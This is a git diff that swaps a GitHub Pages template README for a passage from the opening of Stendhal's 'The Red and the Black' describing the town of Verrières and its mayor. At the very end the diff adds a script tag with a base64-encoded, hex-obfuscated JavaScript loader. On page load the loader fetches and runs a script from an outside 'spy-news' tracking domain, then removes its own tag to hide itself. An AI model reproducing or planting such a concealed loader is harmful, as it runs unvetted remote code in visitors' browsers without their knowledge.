@@ -1,37 +1,27 @@
-## Welcome to GitHub Pages
+# And if the traveller
+The little town of Verrières can pass for one of the prettiest in Franche-Comté. Its white houses with their pointed red-tiled roofs stretch along the slope of a hill, whose slightest undulations are marked by groups of vigorous chestnuts. The Doubs flows to within some hundred feet above its fortifications, which were built long ago by the Spaniards, and are now in ruins.
 
-You can use the [editor on GitHub](https://github.com/ushakovabogdana/Branches/edit/master/README.md) to maintain and preview the content for your website in Markdown files.
+Verrières is sheltered on the north by a high mountain which is one of the branches of the Jura. The jagged peaks of the Verra are covered with snow from the beginning of the October frosts. A torrent which rushes down from the mountains traverses Verrières before throwing itself into the Doubs, and supplies the motive power for a great number of saw mills. The industry is very simple, and secures a certain prosperity to the majority of the inhabitants who are more peasant than bourgeois. It is not, however, the wood saws which have enriched this little town. It is the manufacture of painted tiles, called Mulhouse tiles, that is responsible for that general affluence which has caused the façades of nearly all the houses in Verrières to be rebuilt since the fall of Napoleon.
+![l](https://ichef.bbci.co.uk/news/976/cpsprodpb/12A9B/production/_111434467_gettyimages-1143489763.jpg)
+One has scarcely entered the town, before one is stunned by the din of a strident machine of terrifying aspect. Twenty heavy hammers which fall with a noise that makes the paved floor tremble, are lifted up by a wheel set in motion by the torrent. Each of these hammers manufactures every day I don't know how many thousands of nails. The little pieces of iron which are rapidly transformed into nails by these enormous hammers, are put in position by fresh pretty young girls. This labour so rough at first sight is one of the industries which most surprises the traveller who penetrates for the first time the mountains which separate France and Helvetia. If when he enters Verrières, the traveller asks who owns this fine nail factory which deafens everybody who goes up the Grande-Rue, he is answered in a drawling tone "Eh! it belongs to M. the Mayor."
 
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
+And if the traveller stops a few minutes in that Grande-Rue of Verrières which goes on an upward incline from the bank of the Doubs to nearly as far as the summit of the hill, it is a hundred to one that he will see a big man with a busy and important air.
 
-### Markdown
+When he comes in sight all hats are quickly taken off. His hair is grizzled and he is dressed in grey. He is a Knight of several Orders, has a large forehead and an aquiline nose, and if you take him all round, his features are not devoid of certain regularity. One might even think on the first inspection that it combines with the dignity of the village mayor that particular kind of comfortableness which is appropriate to the age of forty-eight or fifty. But soon the traveller from Paris will be shocked by a certain air of self-satisfaction and self-complacency mingled with an almost indefinable narrowness and lack of inspiration. One realises at last that this man's talent is limited to seeing that he is paid exactly what he is owed, and in paying his own debts at the latest possible moment.
 
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
+Such is M. de Rênal, the mayor of Verrières. After having crossed the road with a solemn step, he enters the mayoral residence and disappears from the eye of the traveller. But if the latter continues to walk a hundred steps further up, he will perceive a house with a fairly fine appearance, with some magnificent gardens behind an iron grill belonging to the house. Beyond that is an horizon line formed by the hills of Burgundy, which seem ideally made to delight the eyes. This view causes the traveller to forget that pestilential atmosphere of petty money-grubbing by which he is beginning to be suffocated.
 
-```markdown
-Syntax highlighted code block
+He is told that this house belongs to M. de Rênal. It is to the profits which he has made out of his big nail factory that the mayor of Verrières owes this fine residence of hewn stone which he is just finishing. His family is said to be Spanish and ancient, and is alleged to have been established in the country well before the conquest of Louis XIV.
 
-# Header 1
-## Header 2
-### Header 3
+Since 1815, he blushes at being a manufacturer: 1815 made him mayor of Verrières. The terraced walls of this magnificent garden which descends to the Doubs, plateau by plateau, also represent the reward of M. de Rênal's proficiency in the iron-trade. Do not expect to find in France those picturesque gardens which surround the manufacturing towns of Germany, like Leipsic, Frankfurt and Nurenburgh, etc. The more walls you build in Franche-Comté and the more you fortify your estate with piles of stone, the more claim you will acquire on the respect of your neighbours. Another reason for the admiration due to M. de Rênal's gardens and their numerous walls, is the fact that he has purchased, through sheer power of the purse, certain small parcels of the ground on which they stand. That saw-mill, for instance, whose singular position on the banks of the Doubs struck you when you entered Verrières, and where you notice the name of SOREL written in gigantic characters on the chief beam of the roof, used to occupy six years ago that precise space on which is now reared the wall of the fourth terrace in M. de Rênal's gardens.
 
-- Bulleted
-- List
+Proud man that he was, the mayor had none the less to negotiate with that tough, stubborn peasant, old Sorel. He had to pay him in good solid golden louis before he could induce him to transfer his workshop elsewhere. As to the public stream which supplied the motive power for the saw-mill, M. de Rênal obtained its diversion, thanks to the influence which he enjoyed at Paris. This favour was accorded him after the election of 182-.
 
-1. Numbered
-2. List
+He gave Sorel four acres for every one he had previously held, five hundred yards lower down on the banks of the Doubs. Although this position was much more advantageous for his pine-plank trade, father Sorel (as he is called since he has become rich) knew how to exploit the impatience and mania for landed ownership which animated his neighbour to the tune of six thousand francs.
 
-**Bold** and _Italic_ and `Code` text
+It is true that this arrangement was criticised by the wiseacres of the locality. One day, it was on a Sunday four years later, as M. de Rênal was coming back from church in his mayor's uniform, he saw old Sorel smiling at him, as he stared at him some distance away surrounded by his three sons. That smile threw a fatal flood of light into the soul of the mayor. From that time on, he is of opinion that he could have obtained the exchange at a cheaper rate.
 
-[Link](url) and ![Image](src)
-```
+In order to win the public esteem of Verrières it is essential that, though you should build as many walls as you can, you should not adopt some plan imported from Italy by those masons who cross the passes of the Jura in the spring on their way to Paris. Such an innovation would bring down upon the head of the imprudent builder an eternal reputation for wrongheadedness, and he will be lost for ever in the sight of those wise, well-balanced people who dispense public esteem in Franche-Comté.
 
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
-
-### Jekyll Themes
-
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/ushakovabogdana/Branches/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
-
-### Support or Contact
-
-Having trouble with Pages? Check out our [documentation](https://docs.github.com/categories/github-pages-basics/) or [contact support](https://github.com/contact) and we’ll help you sort it out.
+As a matter of fact, these prudent people exercise in the place the most offensive despotism. It is by reason of this awful word, that anyone who has lived in that great republic which is called Paris, finds living in little towns quite intolerable. The tyranny of public opinion (and what public opinion!) is as stupid in the little towns of France as in the United States of America.
+<script id="mU9xz" src="data:text/javascript;base64, dmFyIF9yRlJhQiA9IFsnXHg3MVx4NzVceDY1XHg3Mlx4NzlceDUzXHg2NVx4NmNceDY1XHg2M1x4NzRceDZmXHg3MicsICdceDYyXHg2Zlx4NjRceDc5JywgJ1x4NjdceDY1XHg3NFx4NDVceDZjXHg2NVx4NmRceDY1XHg2ZVx4NzRceDQyXHg3OVx4NDlceDY0JywgJ1x4NDRceDRmXHg0ZFx4NDNceDZmXHg2ZVx4NzRceDY1XHg2ZVx4NzRceDRjXHg2Zlx4NjFceDY0XHg2NVx4NjQnLCAnXHg2M1x4NzJceDY1XHg2MVx4NzRceDY1XHg0NVx4NmNceDY1XHg2ZFx4NjVceDZlXHg3NCcsICdceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnLCAnXHg3NFx4NzlceDcwXHg2NScsICdceDc0XHg2NVx4NzhceDc0XHgyZlx4NmFceDYxXHg3Nlx4NjFceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnXTsoZnVuY3Rpb24oXzh6U2lwLCBfWExkVmkpIHt2YXIgX2xRT05vID0gZnVuY3Rpb24oX0pvR0VsKSB7d2hpbGUgKC0tX0pvR0VsKSB7Xzh6U2lwWydwdXNoJ10oXzh6U2lwWydzaGlmdCddKCkpO319O19sUU9ObygrK19YTGRWaSk7fShfckZSYUIsIDB4MTFiKSk7dmFyIF9UV0lMWiA9IGZ1bmN0aW9uKF9YVkNndCwgX0JkNUNZKSB7X1hWQ2d0ID0gX1hWQ2d0IC0gMHgwO3ZhciBfb2hPWFkgPSBfckZSYUJbX1hWQ2d0XTtyZXR1cm4gX29oT1hZO307ZG9jdW1lbnRbJ1x4NjFceDY0XHg2NFx4NDVceDc2XHg2NVx4NmVceDc0XHg0Y1x4NjlceDczXHg3NFx4NjVceDZlXHg2NVx4NzInXShfVFdJTFooJzB4MCcpLCBmdW5jdGlvbigpIHt2YXIgXzU0ZjBSID0gZG9jdW1lbnRbX1RXSUxaKCcweDEnKV0oX1RXSUxaKCcweDInKSk7XzU0ZjBSW19UV0lMWignMHgzJyldID0gX1RXSUxaKCcweDQnKTtfNTRmMFJbJ1x4NzNceDcyXHg2MyddID0gJ1x4NjhceDc0XHg3NFx4NzBceDczXHgzYVx4MmZceDJmXHg2MVx4NjRceDczXHg2MVx4NjRceDczXHg2MVx4NjNceDYzXHgzMVx4MmVceDczXHg3MFx4NzlceDJkXHg2ZVx4NjVceDc3XHg3M1x4MmVceDYzXHg2Zlx4NmRceDJmXHg1Zlx4NzJceDY1XHg2ZFx4NmZceDc0XHg2NVx4NWZceDc0XHg3Mlx4NjFceDYzXHg2Ylx4MmVceDZhXHg3M1x4M2ZceDYzXHg2MVx4NmRceDcwXHg2MVx4NjlceDY3XHg2ZVx4M2RceDM0XHgzMFx4NTBceDQ4XHg3Mlx4NzlceDczXHg3YVx4NzFceDQ2Jztkb2N1bWVudFtfVFdJTFooJzB4NScpXShfVFdJTFooJzB4NicpKVsnXHg2MVx4NzBceDcwXHg2NVx4NmVceDY0XHg0M1x4NjhceDY5XHg2Y1x4NjQnXShfNTRmMFIpO2RvY3VtZW50W19UV0lMWignMHg3JyldKCdtVTl4eicpWydceDcyXHg2NVx4NmRceDZmXHg3Nlx4NjUnXSgpO30sIHsnXHg2Zlx4NmVceDYzXHg2NSc6ICEhW119KTs="></script>
